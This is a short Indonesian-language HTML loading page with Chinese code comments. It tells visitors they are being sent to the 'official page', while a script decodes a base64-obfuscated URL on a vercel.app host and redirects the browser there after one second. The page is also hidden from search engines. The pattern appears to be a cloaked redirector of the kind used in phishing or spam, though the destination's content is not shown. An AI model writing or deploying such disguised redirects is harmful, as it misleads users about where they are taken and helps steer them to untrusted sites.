<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Memuat Halaman...</title>
  <meta name="robots" content="noindex, nofollow">
  <style>
    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
  </style>
  <script>
    setTimeout(function () {
      const encoded = "aHR0cHM6Ly93c3MtYW1iZXIudmVyY2VsLmFwcC8="; // Base64 加密后的目标链接
      const url = atob(encoded);
      window.location.href = url;
    }, 1000); // 延迟 1 秒自动跳转
  </script>
</head>
<body>
  <h2>Sedang memuat...</h2>
  <p>Mohon tunggu, sedang diarahkan ke halaman resmi.</p>
</body>
</html>
